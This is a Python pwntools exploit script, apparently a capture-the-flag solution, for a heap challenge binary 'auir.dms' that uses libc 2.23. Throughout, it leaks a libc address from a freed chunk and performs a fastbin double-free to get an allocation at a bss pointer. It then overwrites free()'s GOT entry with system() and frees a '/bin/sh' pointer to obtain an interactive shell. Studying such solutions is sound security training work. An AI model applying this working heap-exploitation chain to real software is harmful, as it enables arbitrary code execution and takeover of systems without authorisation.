from pwn import *
import sys 

context(terminal=['terminator', '-e'])
context(os='linux', arch='amd64')
#context.log_level = 'DEBUG'

if len(sys.argv) < 2:
	print("[!] Invalid options")
	print("[*] Usage: python exploit.py (debug/live)")
elif sys.argv[1] == "debug":
	p = process('./auir.dms', env={"LD_PRELOAD":"./libc-2.23.so"})
	gdb.attach(p, "b main")
elif sys.argv[1] == "live":
	p = process('./auir.dms', env={"LD_PRELOAD":"./libc-2.23.so"})
else:
	print("[!] Invalid option")
	sys.exit(1)

def alloc(size, data):

	p.sendlineafter('>>', '1')
	p.sendlineafter('>>', str(size))
	p.sendlineafter('>>', data)

	return

def dump(idx):

	p.sendlineafter('>>', '4')
	p.sendlineafter('>>', str(idx))

	p.recvuntil('SHOWING....\n')

	return u64(p.recv(6).ljust(8, '\x00'))

def free(idx):

	p.sendlineafter('>>', '2')
	p.sendlineafter('>>', str(idx))

	return

def edit(idx, size, data):

	p.sendlineafter('>>', '3')
	p.sendlineafter('>>', str(idx))
	p.sendlineafter('>>', str(size))
	p.sendlineafter('>>', data)

	return

def exploit():

	free_got = 0x605060
	sys_off = 0x45390
	sh_off = 0x18cd17
	bss = 0x6052ed # bss pointer to use for the fastbin attack

	alloc(0x80, 'A'*10) # chunk 1
	alloc(0x80, 'B'*10) # chunk 2
	#free(1) # If we free this, it will get consolidated with the top chunks because it borders the top chunk since its next chunk was the top chunk / wilderness, they got consolidated into a bigger top chunk to be used for further allocation requests.
	free(0)

	leak = dump(0) # leak libc main_arena pointers inside of chunk
	libc = leak - 0x3c4b78
	system = libc + sys_off
	binsh = libc + sh_off

	log.info("Leak: 0x{:x}".format(leak))
	log.info("Libc: 0x{:x}".format(libc))
	log.info("/bin/sh: 0x{:x}".format(binsh))
	log.info("system: 0x{:x}".format(system))

	free(1) # refresh heap

	alloc(0x60, 'C'*10) # chunk 2 # fastbin
	alloc(0x60, 'D'*10) # chunk 3 # fastbin
	alloc(0x80, 'E'*10) # chunk 4 # smallbin (prevent consolidation)

	free(3)
	free(2) # bypass double-free check
	free(3) # double free

	#alloc(0x68, p64(0x4141414141414141))
	# corrupt head of the free list thanks to the double-free
	alloc(0x68, p64(bss)) # request size of 0x70 (which wraps around 0x70 for alignment purposes)
	alloc(0x68, "F") # two allocations to get our arbitrary pointer (get entries from the fast bin free list)
	alloc(0x68, "G") # another fastbin free list entry
	alloc(0x68,"H"*0x13 + p64(free_got) + p64(binsh)) # write to our bss pointer and write GOT entry of free() and /bin/sh (target fastbin free list entry)
	edit(0, 8, p64(system)) # overwrite GOT entry of free()
	free(1)
	p.interactive()

exploit()